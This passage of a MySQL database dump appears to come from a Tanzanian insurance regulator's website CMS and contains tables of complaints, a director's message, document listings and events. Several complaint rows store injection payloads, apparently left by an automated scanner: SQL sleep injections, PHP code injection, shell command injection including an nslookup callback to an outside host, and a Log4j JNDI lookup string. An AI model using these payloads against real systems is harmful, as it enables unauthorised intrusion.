10:38:38','sample@email.tst'),(202,'ncMUFCMU','','','','','1',NULL,'\';print(md5(31337));$a=\'','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:38','2022-08-11 10:38:38','sample@email.tst'),(203,'-1\" OR 2+383-383-1=0+0+0+1 --','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:38','2022-08-11 10:38:38','sample@email.tst'),(204,'ncMUFCMU','','','','','`(nslookup hitrcacojhckv6fce0.bxss.me||perl -e \"gethostbyname(\'hitrcacojhckv6fce0.bxss.me\')\")`',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:39','2022-08-11 10:38:39','sample@email.tst'),(205,'ncMUFCMU','','','','','1',NULL,'\";print(md5(31337));$a=\"','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:39','2022-08-11 10:38:39','sample@email.tst'),(206,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'${${:::::::::::::::::-j}ndi:dns${:::::::::::::::::-:}//dns.log4j..-3968..1b7ec${::-.}1${::-.}bxss.me}}','555','','','0000-00-00',0,'2022-08-11 10:38:40','2022-08-11 10:38:40','sample@email.tst'),(207,'ncMUFCMU','','','','','1',NULL,'${@print(md5(31337))}','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:40','2022-08-11 10:38:40','sample@email.tst'),(208,'ncMUFCMU','','','','','1',NULL,'${@print(md5(31337))}\\','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:41','2022-08-11 10:38:41','sample@email.tst'),(209,'if(now()=sysdate(),sleep(15),0)','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:41','2022-08-11 10:38:41','sample@email.tst'),(210,'ncMUFCMU','','','','','1',NULL,'\'.print(md5(31337)).\'','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:42','2022-08-11 10:38:42','sample@email.tst'),(211,'0\'XOR(if(now()=sysdate(),sleep(15),0))XOR\'Z','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:42','2022-08-11 10:38:42','sample@email.tst'),(212,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'echo ngzmlr$()\\ lfnqop\\nz^xyu||a #\' &echo ngzmlr$()\\ lfnqop\\nz^xyu||a #|\" &echo ngzmlr$()\\ lfnqop\\nz^xyu||a #','555','','','0000-00-00',0,'2022-08-11 10:38:42','2022-08-11 10:38:42','sample@email.tst'),(213,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,';assert(base64_decode(\'cHJpbnQobWQ1KDMxMzM3KSk7\'));','555','','','0000-00-00',0,'2022-08-11 10:38:43','2022-08-11 10:38:43','sample@email.tst'),(214,'0\"XOR(if(now()=sysdate(),sleep(15),0))XOR\"Z','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:43','2022-08-11 10:38:43','sample@email.tst'),(215,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'&echo zkfqcy$()\\ wuolnh\\nz^xyu||a #\' &echo zkfqcy$()\\ wuolnh\\nz^xyu||a #|\" &echo zkfqcy$()\\ wuolnh\\nz^xyu||a #','555','','','0000-00-00',0,'2022-08-11 10:38:43','2022-08-11 10:38:43','sample@email.tst'),(216,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'\';print(md5(31337));$a=\'','555','','','0000-00-00',0,'2022-08-11 10:38:44','2022-08-11 10:38:44','sample@email.tst'),(217,'(select(0)from(select(sleep(15)))v)/*\'+(select(0)from(select(sleep(15)))v)+\'\"+(select(0)from(select(sleep(15)))v)+\"*/','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:44','2022-08-11 10:38:44','sample@email.tst'),(218,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'|echo smxado$()\\ gjtxfs\\nz^xyu||a #\' |echo smxado$()\\ gjtxfs\\nz^xyu||a #|\" |echo smxado$()\\ gjtxfs\\nz^xyu||a #','555','','','0000-00-00',0,'2022-08-11 10:38:44','2022-08-11 10:38:44','sample@email.tst'),(219,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1\'\"','555','','','0000-00-00',0,'2022-08-11 10:38:58','2022-08-11 10:38:58','sample@email.tst'),(220,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1\0','555','','','0000-00-00',0,'2022-08-11 10:38:59','2022-08-11 10:38:59','sample@email.tst'),(221,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'@@7sD5V','555','','','0000-00-00',0,'2022-08-11 10:39:00','2022-08-11 10:39:00','sample@email.tst');
/*!40000 ALTER TABLE `complaints` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dg_messages`
--

DROP TABLE IF EXISTS `dg_messages`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dg_messages` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `summary_en` text,
  `summary_sw` text,
  `content_sw` text,
  `content_en` text,
  `status` int(11) NOT NULL DEFAULT '1',
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dg_messages`
--

LOCK TABLES `dg_messages` WRITE;
/*!40000 ALTER TABLE `dg_messages` DISABLE KEYS */;
INSERT INTO `dg_messages` VALUES (2,NULL,NULL,'<p>Dear Viewers of TIRA Website,</p>\r\n\r\n<p>Welcome once again and thank you for visiting to our website <a href=\"http://www.tira.go.tz\">www.tira.go.tz</a> in order to get updated on various information in regard to insurance services in Tanzania. The Authority is dedicated to provide information on insurance and related matters.</p>\r\n\r\n<p>Recently, we have refine-tuned our supervisory system &lsquo;TIRA &ndash; MIS&rsquo; purposely for accommodating more services than motor insurance verification. With enhanced capacity and well-integrated, the system will now keep insurance data, validate motor insurance and other properties (as a new feature), allow submission of complaints electronically (e-complaints) and complete elimination of paper stickers instead using electronic stickers (e-stickers), provide quick and quality services as well as other industry supervision parameters.</p>\r\n\r\n<p>Therefore, motor insurance customers will not be provided with paper stickers by insurance service providers, they will be provided with: insurance cover note, insurance policy and EFD receipt. On the other hand, the TIRA-MIS is integrated with other supervisory systems of Government institutions like Tanzania Police Force, Tanzania Revenue Authority (TIRA), Zanzibar Business and Property Registration Agency (ZBPRA), Business Registration and Licensing Agency (BRELA), National Identification Authority (NIDA) and other regulating bodies in Tanzania Main Land and in the Isles.</p>\r\n\r\n<p>The Authority will continue to renovate the system in order to accommodate customer needs and good serves. We wish to assure insurance customers and the public in general: the accuracy, stability, availability and user friendly of the system.&nbsp; In case of any inconvenience do not hesitate to commutate with us through our addresses on the contact line.</p>\r\n\r\n<p>Thank you</p>','<p>Dear Viewers of TIRA Website,</p>\r\n\r\n<p>Welcome once again and thank you for visiting to our website <a href=\"http://www.tira.go.tz\">www.tira.go.tz</a> in order to get updated on various information in regard to insurance services in Tanzania. The Authority is dedicated to provide information on insurance and related matters.</p>\r\n\r\n<p>Recently, we have refine-tuned our supervisory system &lsquo;TIRA &ndash; MIS&rsquo; purposely for accommodating more services than motor insurance verification. With enhanced capacity and well-integrated, the system will now keep insurance data, validate motor insurance and other properties (as a new feature), allow submission of complaints electronically (e-complaints) and complete elimination of paper stickers instead using electronic stickers (e-stickers), provide quick and quality services as well as other industry supervision parameters.</p>\r\n\r\n<p>Therefore, motor insurance customers will not be provided with paper stickers by insurance service providers, they will be provided with: insurance cover note, insurance policy and EFD receipt. On the other hand, the TIRA-MIS is integrated with other supervisory systems of Government institutions like Tanzania Police Force, Tanzania Revenue Authority (TIRA), Zanzibar Business and Property Registration Agency (ZBPRA), Business Registration and Licensing Agency (BRELA), National Identification Authority (NIDA) and other regulating bodies in Tanzania Main Land and in the Isles.</p>\r\n\r\n<p>The Authority will continue to renovate the system in order to accommodate customer needs and good serves. We wish to assure insurance customers and the public in general: the accuracy, stability, availability and user friendly of the system.&nbsp; In case of any inconvenience do not hesitate to commutate with us through our addresses on the contact line.</p>\r\n\r\n<p>Thank you</p>',1,'2022-08-12 11:52:51','2022-08-12 08:52:51');
/*!40000 ALTER TABLE `dg_messages` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `document_categories`
--

DROP TABLE IF EXISTS `document_categories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `document_categories` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `featured` tinyint(1) NOT NULL DEFAULT '0',
  `specials` int(11) DEFAULT NULL,
  `services` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=23 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `document_categories`
--

LOCK TABLES `document_categories` WRITE;
/*!40000 ALTER TABLE `document_categories` DISABLE KEYS */;
INSERT INTO `document_categories` VALUES (7,'Insurance Regulations','Insurance Regulations','insurace-regulations',1,'2021-09-14 09:36:38','2022-08-09 17:03:58',0,NULL,NULL),(8,'Miongozo','Guidelines','guidelines',1,'2021-09-14 09:38:57','2022-08-09 17:05:19',0,NULL,NULL),(9,'Licensing Requirements','Licensing Requirements','licensing-requirements',1,'2021-10-13 06:40:40','2022-08-09 17:07:16',1,NULL,NULL),(10,'Insurance licensing Brokers','Insurance licensing Brokers','insurance-licensing-brokers',1,'2022-08-07 10:46:18','2022-08-07 10:46:18',1,NULL,NULL),(11,'Insurance Licensing Company','Insurance Licensing Company','insurance-licensing-company',1,'2022-08-07 10:47:39','2022-08-07 10:47:39',1,NULL,NULL),(12,'Circulars','Circulars','circular',1,'2022-08-07 10:51:17','2022-08-09 17:06:15',0,NULL,NULL),(13,'Quarterly Market Performance Report','Quarterly Market Performance Report','quarterly-market-performance-report',1,'2022-08-07 10:52:10','2022-08-07 10:52:10',0,NULL,NULL),(14,'Presentation | Papers  | speeches','Presentation | Papers  | speeches','presentation-papers-speeches',1,'2022-08-07 10:52:50','2022-08-07 10:53:00',0,NULL,NULL),(15,'Insurance Act','Insurance Act','insurance-act',1,'2022-08-07 10:53:29','2022-08-07 10:53:29',0,NULL,NULL),(16,'Insurance Policy','Insurance Policy','insurance-policy',1,'2022-08-07 10:54:14','2022-08-09 17:04:28',0,NULL,NULL),(17,'Micro Insurance Regulations','Micro Insurance Regulations','micro-insurance-regulations',1,'2022-08-07 10:54:38','2022-08-07 10:54:38',1,NULL,NULL),(18,'Magazines','Magazines','magazines',1,'2022-08-09 17:45:16','2022-08-09 17:45:16',0,NULL,NULL),(19,'Reports','Reports','reports',1,'2022-08-10 05:21:27','2022-08-10 05:21:27',0,NULL,NULL),(20,'Accreditation of Foreign Reinsurance','Accreditation of Foreign Reinsurance','accreditation-of-foreign-reinsurance',1,'2022-08-13 07:02:45','2022-08-13 07:02:45',1,NULL,NULL),(21,'Accreditation of Foreign Reinsurance Brokers','Accreditation of Foreign Reinsurance Brokers','accreditation-of-foreign-reinsurance-brokers',1,'2022-08-13 07:04:36','2022-08-13 07:04:36',1,NULL,NULL),(22,'Insurance Agents Licensing','Insurance Agents Licensing','insurance-agents-licensing',1,'2022-08-13 07:06:00','2022-08-13 07:06:00',1,NULL,NULL);
/*!40000 ALTER TABLE `document_categories` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `documents`
--

DROP TABLE IF EXISTS `documents`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `documents` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `file_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `file_en` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `featured` tinyint(1) DEFAULT '0',
  `active` tinyint(1) NOT NULL,
  `published_date` date NOT NULL,
  `category_id` int(10) unsigned NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `publications_category_id_index` (`category_id`)
) ENGINE=InnoDB AUTO_INCREMENT=39 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `documents`
--

LOCK TABLES `documents` WRITE;
/*!40000 ALTER TABLE `documents` DISABLE KEYS */;
INSERT INTO `documents` VALUES (4,'New Guide','Guide Mpya','sw-1656615782-SKILLS FOR  JOB (1).pdf','en-1656615782-SKILLS FOR  JOB (1).doc',0,1,'2022-06-14',5,'2022-06-30 16:03:02','2022-06-30 16:03:02'),(11,'CIRCULAR NO. 102/2021 TO ALL BANCASSURANCE AGENCIES','CIRCULAR NO. 102/2021 TO ALL BANCASSURANCE AGENCIES','sw-1660210900-A CIRCULAR TO ALL BANCASSURANCE AGENCIES FILING.pdf','en-1660210900-A CIRCULAR TO ALL BANCASSURANCE AGENCIES FILING.pdf',0,1,'2022-08-11',12,'2022-08-11 06:41:40','2022-08-11 06:41:40'),(12,'CIRCULAR NO. 101/2021 TO ALL INSURANCE ACTUARIES','CIRCULAR NO. 101/2021 TO ALL INSURANCE ACTUARIES','sw-1660293158-A CIRCULAR TO ALL INSURANCE  ACTUARIES.pdf','en-1660293158-A CIRCULAR TO ALL INSURANCE  ACTUARIES.pdf',0,1,'2022-08-12',12,'2022-08-12 05:32:38','2022-08-12 05:32:38'),(13,'Guidelines on the Implementation of IFRS 17, 2022','Guidelines on the Implementation of IFRS 17, 2022','sw-1660294599-Guidelines on the Implementation of IFRS 17, 2022.pdf','en-1660294599-Guidelines on the Implementation of IFRS 17, 2022.pdf',0,1,'2022-08-12',8,'2022-08-12 05:56:39','2022-08-12 05:56:39'),(14,'MWONGOZO YA MAAFISA WAUZA BIMA','MWONGOZO YA MAAFISA WAUZA BIMA','sw-1660294723-MWONGOZO YA MAAFISA WAUZA BIMA.pdf','en-1660294723-MWONGOZO YA MAAFISA WAUZA BIMA.pdf',0,1,'2022-08-12',8,'2022-08-12 05:58:43','2022-08-12 05:58:43'),(15,'MWONGOZO WA UTOAJI HUDUMA ZA BIMA KIDIJITALI','MWONGOZO WA UTOAJI HUDUMA ZA BIMA KIDIJITALI','sw-1660294935-MWONGOZO WA UTOAJI HUDUMA ZA BIMA KIDIJITALI.pdf','en-1660294935-MWONGOZO WA UTOAJI HUDUMA ZA BIMA KIDIJITALI.pdf',0,1,'2022-08-12',8,'2022-08-12 06:02:15','2022-08-12 06:02:15'),(16,'MWONGOZO WA UENDESHAJI WA TAKAFUL','MWONGOZO WA UENDESHAJI WA TAKAFUL','sw-1660295080-MWONGOZO WA UENDESHAJI WA TAKAFUL _0.pdf','en-1660295080-MWONGOZO WA UENDESHAJI WA TAKAFUL _0.pdf',0,1,'2022-08-12',8,'2022-08-12 06:04:40','2022-08-12 06:04:40'),(17,'G N INSURANCE REGULATIONS-2009 Final','G N INSURANCE REGULATIONS-2009 Final','sw-1660295576-Insurance Regulations of 2009.pdf','en-1660295576-Insurance Regulations of 2009.pdf',0,1,'2022-08-12',7,'2022-08-12 06:12:56','2022-08-12 06:12:56'),(19,'Insurance Act','Insurance Act','sw-1660295855-Insurance Act No 10 of 2009.pdf','en-1660295855-Insurance Act No 10 of 2009.pdf',0,1,'2022-08-12',15,'2022-08-12 06:17:35','2022-08-12 06:17:35'),(20,'Micro Insurance Regulations','Micro Insurance Regulations','sw-1660297131-Micro_Insurance-Regulations_2013.pdf','en-1660297131-Micro_Insurance-Regulations_2013.pdf',0,1,'2022-08-12',17,'2022-08-12 06:38:51','2022-08-12 06:38:51'),(21,'Micro Insurance Regulations','Micro Insurance Regulations','sw-1660297233-Micro_Insurance-Regulations_2013.pdf','en-1660297233-Insurance Regulations of 2009.pdf',0,1,'2022-08-12',7,'2022-08-12 06:40:33','2022-08-12 06:40:33'),(22,'REQUIREMENTS FOR LICENSING INSURANCE COMPANY FOR THE YEAR 2021','REQUIREMENTS FOR LICENSING INSURANCE COMPANY FOR THE YEAR 2021','sw-1660298364-CHECKLIST FOR LICENSING INSURANCE COMPANY.pdf','en-1660298364-CHECKLIST FOR LICENSING INSURANCE COMPANY.pdf',0,1,'2022-08-12',9,'2022-08-12 06:59:24','2022-08-12 06:59:24'),(23,'FORM B FOR INSURERS & REINSURES FOR RENEWAL 2020','FORM B FOR INSURERS & REINSURES FOR RENEWAL 2020','sw-1660372598-FORM B FOR INSURERS &  REINSURES FOR RENEWAL 2020 (2).xlsx','en-1660372598-FORM B FOR INSURERS &  REINSURES FOR RENEWAL 2020 (2).xlsx',0,1,'2022-08-12',9,'2022-08-13 03:36:38','2022-08-13 03:36:38'),(24,'APPLICATION FORM NO 1- Insurance Company_Reinsurers','APPLICATION FORM NO 1- Insurance Company_Reinsurers','sw-1660372741-APPLICATION FORM NO 1- Insurance Company_Reinsurers.pdf','en-1660372741-APPLICATION FORM NO 1- Insurance Company_Reinsurers.pdf',0,1,'2022-08-12',9,'2022-08-13 03:39:01','2022-08-13 03:39:01'),(25,'REQUIREMENTS FOR REGISTRATION AS AN INSURANCE COMPANY','REQUIREMENTS FOR REGISTRATION AS AN INSURANCE COMPANY','sw-1660372875-REGISTRATION REQUIREMENTS 2018 -INSURANCE COMPANY.pdf','en-1660372875-REGISTRATION REQUIREMENTS 2018 -INSURANCE COMPANY.pdf',0,1,'2022-08-12',9,'2022-08-13 03:41:15','2022-08-13 03:41:15'),(26,'REQUIREMENTS FOR LICENSING BANCASSURANCE AGENT','REQUIREMENTS FOR LICENSING BANCASSURANCE AGENT','sw-1660401376-REQUIREMENTS FOR LICENSING BANCASSURANCE AGENT.pdf','en-1660401376-REQUIREMENTS FOR LICENSING BANCASSURANCE AGENT.pdf',0,1,'2022-08-12',22,'2022-08-13 11:36:16','2022-08-13 11:36:16'),(27,'REQUIREMENTS FOR LICENSING BANCASSURANCE AGENT','REQUIREMENTS FOR LICENSING BANCASSURANCE AGENT','sw-1660401510-Questionaires_Bancassurance.pdf','en-1660401510-Questionaires_Bancassurance.pdf',0,1,'2022-08-12',22,'2022-08-13 11:38:30','2022-08-13 11:38:30'),(28,'CHECKLIST BANCASSURANCE AGENT','CHECKLIST BANCASSURANCE AGENT','sw-1660401607-Checklist_Bancassurance Agent_0.pdf','en-1660401607-Checklist_Bancassurance Agent_0.pdf',0,1,'2022-08-12',22,'2022-08-13 11:40:07','2022-08-13 11:40:07'),(29,'CHECKLIST BANCASSURANCE AGENT','CHECKLIST BANCASSURANCE AGENT','sw-1660401707-Checklist_Bancassurance Agent.pdf','en-1660401707-Checklist_Bancassurance Agent.pdf',0,1,'2022-08-12',22,'2022-08-13 11:41:47','2022-08-13 11:41:47'),(30,'BANCASSURANCE AGENTS FEES','BANCASSURANCE AGENTS FEES','sw-1660401781-Bancassurance Agents_FEES_0.pdf','en-1660401781-Bancassurance Agents_FEES_0.pdf',0,1,'2022-08-12',22,'2022-08-13 11:43:01','2022-08-13 11:43:01'),(31,'APPLICATION FORM BANCASSURANCE AGENT','APPLICATION FORM BANCASSURANCE AGENT','sw-1660401952-Application Form_Bancassurance Agent_0.pdf','en-1660401952-Application Form_Bancassurance Agent_0.pdf',0,1,'2022-08-12',22,'2022-08-13 11:45:52','2022-08-13 11:45:52'),(32,'APPLICATION FORM no 3(b)-Insurance Agents_Assessors_Loss adjusters_Private Investigators_Surveyors','APPLICATION FORM no 3(b)-Insurance Agents_Assessors_Loss adjusters_Private Investigators_Surveyors','sw-1660402306-APPLICATION FORM  no  3(b)-Insurance Agents_Assessors_Loss adjusters_Private Investigators_Surveyors.pdf','en-1660402306-APPLICATION FORM  no  3(b)-Insurance Agents_Assessors_Loss adjusters_Private Investigators_Surveyors.pdf',0,1,'2022-08-12',22,'2022-08-13 11:51:46','2022-08-13 11:51:46'),(33,'REQUIREMENTS OF REGISTRATION AS AN INSURANCE AGENT|ADJUSTER|INVESTIGATOR.-2018','REQUIREMENTS OF REGISTRATION AS AN INSURANCE AGENT|ADJUSTER|INVESTIGATOR.-2018','sw-1660402634-REGISTRATION REQUIREMENTS 2018 -INSURANCE AGENCY_ADJUSTER_INVESTIGATOR.pdf','en-1660402634-REGISTRATION REQUIREMENTS 2018 -INSURANCE AGENCY_ADJUSTER_INVESTIGATOR.pdf',0,1,'2022-08-12',22,'2022-08-13 11:57:14','2022-08-13 11:57:14'),(34,'REQUIREMENTS FOR LICENSING INSURANCE ACTUARY','REQUIREMENTS FOR LICENSING INSURANCE ACTUARY','sw-1660402832-REQUIREMENTS FOR LICENSING INSURANCE ACTUARY.pdf','en-1660402832-REQUIREMENTS FOR LICENSING INSURANCE ACTUARY.pdf',0,1,'2022-08-12',22,'2022-08-13 12:00:32','2022-08-13 12:00:32'),(35,'TEMPLATE FOR COMPUTATION OF BROKERS CAPITAL FOR YEAR 2020','TEMPLATE FOR COMPUTATION OF BROKERS CAPITAL FOR YEAR 2020','sw-1660403926-TEMPLATE FOR COMPUTATION OF BROKERS CAPITAL FOR YEAR 2020_0 (1).xlsx','en-1660403926-TEMPLATE FOR COMPUTATION OF BROKERS CAPITAL FOR YEAR 2020_0 (1).xlsx',0,1,'2022-08-12',10,'2022-08-13 12:18:46','2022-08-13 12:18:46'),(36,'ANNEXURE','ANNEXURE','sw-1660404161-ANNEXURE 1_FINAL.XLSX','en-1660404161-ANNEXURE 1_FINAL.XLSX',0,1,'2022-08-12',20,'2022-08-13 12:22:41','2022-08-13 12:22:41'),(37,'Application Form Accreditation of Reinsurer','Application Form Accreditation of Reinsurer','sw-1660404817-APPLICATION FORM FORM_ACCREDITATION_REINSURER.PDF','en-1660404817-APPLICATION FORM FORM_ACCREDITATION_REINSURER.PDF',0,1,'2022-08-12',20,'2022-08-13 12:33:37','2022-08-13 12:33:37'),(38,'Application Form for Accreditation of Broker','Application Form for Accreditation of Broker','sw-1660405354-APPLICATION FORM FORM_ACCREDITATION_BROKER.PDF','en-1660405354-APPLICATION FORM FORM_ACCREDITATION_BROKER.PDF',0,1,'2022-08-12',21,'2022-08-13 12:42:34','2022-08-13 12:42:34');
/*!40000 ALTER TABLE `documents` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `events`
--

DROP TABLE IF EXISTS `events`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `events` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `event_date` date DEFAULT NULL,
  `event_time` varchar(18) COLLATE utf8mb4_unicode_ci NOT NULL,
  `location` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL,
  `contact` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `summary_sw` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `summary_en` text COLLATE utf8mb4_unicode_ci,
  `content_sw` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `content_en` text COLLATE utf8mb4_unicode_ci,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `user_id` int(11) NOT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `photo_url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `events`
--

LOCK TABLES `events` WRITE;
/*!40000 ALTER TABLE `events` DISABLE KEYS */;
INSERT INTO `events` VALUES (1,'2021-08-13','11:00AM - 2:30PM','Nkrumah Hall',NULL,'Changes in Second Stakeholders General Meeting','Changes in Second Stakeholders General Meeting','',NULL,'<p>Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting</p>','<p>Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting</p>',1,1,'changes-in-second-stakeholders-general-meeting','5f0814d557088a67edbbe7b8a2ea1fa5.jpeg','2021-08-02 03:28:10','2021-08-02 03:28:10'),(2,'2021-08-19','11:00AM - 2:30PM','Nkrumah Hall',NULL,'Changes in Second Stakeholders General Meeting','Changes in Second Stakeholders General Meeting','',NULL,'<p>Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting</p>','<p>Changes in Second Stakeholders General Meeting Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting</p>',1,1,'changes-in-second-stakeholders-general-meeting-2','19c85af6feaf700d95b0653f677ebdf9.jpeg','2021-08-02 03:30:48','2021-08-02 03:30:48'),(3,'2021-08-20','11:00AM - 2:30PM','Nkrumah Hall','Dr. Jane John Doe, janedoe@mail.com, 255 754 998 764','Mkutano wa Wawekezaji','Investors Meeting','',NULL,'<p>Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting</p>','<p>Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;</p>',1,1,'changes-in-second-stakeholders-general-meeting-3','e153ca773f33545712009cb3b44d8680.jpeg','2021-08-02 03:32:16','2022-03-10 04:33:59'),(4,'2021-08-12','11:00AM - 2:30PM','Nkrumah Hall',NULL,'Changes in Second Stakeholders General Meeting','Changes in Second Stakeholders General Meeting','',NULL,'<p>Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting</p>','<p>Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting</p>',1,1,'changes-in-second-stakeholders-general-meeting-4','93179b6450b24999094300288cd655a4.jpeg','2021-08-02 03:34:28','2021-08-02 03:34:28'),(5,'2022-02-07','07:00AM - 12:30PM','KarimJee, Dar es Salaam','GBT, info@gbt.go.tz','Demo Menu','Demo News','',NULL,'<p>bjnknj</p>','<p>jllnm</p>',1,1,'demo-news','53f114f1c69175b8f7b88ea9c1a9596b.jpeg','2022-02-07 09:19:44','2022-03-10 04:31:24');
/*!40000 ALTER TABLE `events` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `faqs`
--

DROP TABLE IF EXISTS `faqs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `faqs` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `question_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `question_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `answer_sw` text COLLATE utf8mb4_unicode_ci NOT NULL,
